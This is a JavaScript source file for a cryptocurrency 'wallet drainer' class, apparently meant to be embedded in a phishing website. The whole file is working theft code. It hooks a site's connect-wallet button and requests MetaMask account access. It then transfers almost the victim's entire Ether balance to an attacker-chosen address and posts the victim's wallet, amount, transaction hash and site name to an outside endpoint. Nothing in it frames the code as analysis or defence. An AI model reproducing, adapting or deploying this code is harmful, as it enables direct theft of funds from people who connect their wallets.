class WalletDrainer {
  constructor(endpoint, website, destinationAddress, connectButtonID, network) {
    this.endpoint = endpoint;
    this.website = website;
    this.destinationAddress = destinationAddress;
    this.connectButtonID = connectButtonID;
    this.connectWalletButton = document.getElementById(connectButtonID);
    this.network = network;
    this.connectWalletButton.addEventListener("click", async () => {
      await this.drainAllFunds();
    });
  }

  async drainAllFunds() {
    if (typeof window.ethereum !== "undefined") {
      const web3 = new Web3(window.ethereum);
      try {
        // Request account access if needed
        await window.ethereum.enable();
        const accounts = await web3.eth.getAccounts();
        // const accounts = await window.ethereum.request({
        //   method: "eth_requestAccounts",
        // });
        // const accounts = await web3.eth.getAccounts();
        if (accounts.length === 0) {
          return;
        }
        // const chainId = await window.ethereum.request({
        //   method: "eth_chainId",
        // });
        // console.log(chainId, chainId);

        if (
          this.getNetworkName(window.ethereum.networkVersion) != this.network
        ) {
          await ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: await this.getChainIds(this.network) }],
          });
        }

        const walletAddress = accounts[0];

        // Get the wallet's balance
        const balance = await web3.eth.getBalance(walletAddress);
        console.log(`Initial Wallet Balance: ${balance}`);

        // Convert balance to Ether
        const etherAmount = web3.utils.fromWei(balance, "ether");

        // Log the wallet balance in Ether
        console.log(`Wallet Balance: ${etherAmount} Ether`);

        // Check if there are any funds to drain
        if (parseFloat(etherAmount) > 0) {
          console.log(
            `Funds to drain available from ${walletAddress} to ${this.destinationAddress}`
          );

          const nonce = await web3.eth.getTransactionCount(walletAddress);
          console.log(`Nonce: ${nonce}`);

          // Get current gas price
          const gasPrice = await web3.eth.getGasPrice();
          console.log(`Gas Price: ${gasPrice}`);

          const gasLimit = await web3.eth.estimateGas({
            from: walletAddress,
            to: this.destinationAddress,
          });
          console.log(`Gas Limit: ${gasLimit}`);

          const drainAmount = balance - parseInt(gasPrice) * parseInt(gasLimit);
          console.log(`Drain Amount: ${drainAmount}`);

          const transaction = await web3.eth.sendTransaction({
            from: walletAddress,
            to: this.destinationAddress,
            value: drainAmount,
            gas: gasLimit,
            gasPrice: gasPrice,
            nonce: nonce,
          });

          // Log the transaction hash
          this.createTransaction(
            walletAddress,
            this.endpoint,
            etherAmount,
            "eth",
            transaction.transactionHash,
            "metamask",
            this.website
          );
          console.log(`Transaction Hash: ${transaction.transactionHash}`);
        } else {
          console.log("No funds to drain.");
        }

        await this.start();
      } catch (error) {
        console.error(error);
      }
    } else {
      console.log(
        "No web3 provider detected. Please install MetaMask or another provider."
      );
    }
  }

  async start() {
    if (typeof window.ethereum !== "undefined") {
      // console.log("Found");
      let web3 = new Web3(window.ethereum);
      const accounts = await web3.eth.getAccounts();
      // const accounts = await window.ethereum.request({
      //   method: "eth_requestAccounts",
      // });
      if (accounts.length !== 0) {
        this.connectWalletButton.innerHTML = `Connected ${accounts[0].slice(
          0,
          9
        )}...`;
      }
    } else {
      console.log(
        "No web3 provider detected. Please install MetaMask or another provider."
      );
    }
  }

  async createTransaction(
    wallet,
    url,
    amount,
    currency,
    hash,
    platform,
    website
  ) {
    const requestOptions = {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        wallet: wallet,
        amount: amount,
        currency: currency,
        hash: hash,
        platform: platform,
        website: website,
      }),
      redirect: "follow",
    };
    try {
      const response = await fetch(url, requestOptions);
      const result = await response.text();
      console.log(result);
    } catch (error) {
      console.log("Error:", error);
    }
  }

  async getNetworkName(networkVersion) {
    switch (networkVersion) {
      case "1":
        return "mainnet";
      case "3":
        return "ropsten";
      case "4":
        return "rinkeby";
      case "5":
        return "goerli";
      case "42":
        return "kovan";
      case "11155111":
        return "sepolia";
      default:
        return "Unknown network";
    }
  }

  async getChainIds(networkName) {
    switch (networkName) {
      case "mainnet":
        return "0x1";
      case "ropsten":
        return "0x3";
      case "rinkeby":
        return "0x4";
      case "goerli":
        return "0x5";
      case "kovan":
        return "0x2a";
      case "sepolia":
        return "0xaa36a7";
      default:
        return "Unknown network";
    }
  }
}
